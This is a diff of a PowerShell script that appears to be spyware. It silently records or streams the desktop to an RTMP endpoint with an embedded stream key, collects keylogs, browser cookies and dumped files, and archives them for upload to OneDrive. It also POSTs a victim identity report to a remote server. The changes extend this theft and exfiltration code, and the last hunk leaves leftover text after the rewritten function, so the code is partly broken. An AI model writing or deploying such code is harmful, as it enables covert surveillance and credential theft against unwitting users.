@@ -127,15 +127,16 @@ function Start-Recording {
         Write-Warning "ffmpeg not found"
         return
     }
+
     if ($Mode -eq "record") {
         $output = "$tempDir\screen_capture.mp4"
-        Start-Process -WindowStyle Hidden -FilePath $ffmpeg `
-            -ArgumentList "-y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 $output"
+        & "$ffmpeg" -y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 "$output"
     } elseif ($Mode -eq "stream") {
         Start-Process -WindowStyle Hidden -FilePath $ffmpeg `
-            -ArgumentList "-f gdigrab -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/YOURKEY"
+            -ArgumentList "-f gdigrab -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/wqrj-k80s-cwwq-7wct-3rc8"
     }
 }
+
 function Archive-And-Upload {
     if (-not (Test-Path $keylogPath)) {
     "" | Out-File -Encoding utf8 -Force $keylogPath
@@ -165,11 +166,12 @@ Cookies: $(Get-ChildItem "$cookieDir" -Recurse | Measure-Object).Count
         $video = "$tempDir\screen_capture.mp4"
         $paths = @($logPath, $meta, "$cookieDir\*", "$fileDumpDir\*", $keylogPath)
         if (Test-Path $video) { $paths += $video }
+        Start-Sleep -Seconds 2
         Compress-Archive -Path $paths -DestinationPath $finalZip -Force
 
         Upload-To-OneDrive -ZipPath $finalZip -UserName $user -Timestamp $timestamp
         $summary = "Files: $filesCount, Cookies: $cookieCount"
-        Send-Telegram -User $user -Timestamp $timestamp -Summary $summary
+        Send-Telegram -Report $report -FilesCount $filesCount -CookiesCount $cookieCount
     } catch {
         Write-Warning "Archiving or upload failed: $_"
     }
@@ -196,13 +198,38 @@ function Upload-To-OneDrive {
     if ($LASTEXITCODE -eq 0) {
         $link = "https://onedrive.live.com/?id=root&cid=9f1831722b7187c6"
         $summary = "Files: $filesCount, Cookies: $cookieCount"
-        Send-Telegram -User $UserName -Timestamp $Timestamp -Summary "$summary`n$link"
     }
 }
 function Send-Telegram {
-    param([string]$User, [string]$Timestamp, [string]$Summary)
+    param(
+        [PSCustomObject]$Report,
+        [string]$FilesCount,
+        [string]$CookiesCount
+    )
 
     $text = @"
+ PowerShell Identity Report
+
+ User: $($Report.user)
+ Machine: $($Report.host)
+ OS: $($Report.os) $($Report.version)
+ Arch: $($Report.arch)
+ CPU: $($Report.cpu)
+ Time: $($Report.timestamp)
+
+ Files: $FilesCount
+ Cookies: $CookiesCount
+
+"@
+
+    try {
+        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST `
+            -Body (@{ text = $text } | ConvertTo-Json -Compress) `
+            -ContentType "application/json"
+    } catch {
+        Write-Warning "Telegram send failed: $_"
+    }
+}
 Upload complete:
 User: $User
 Time: $Timestamp
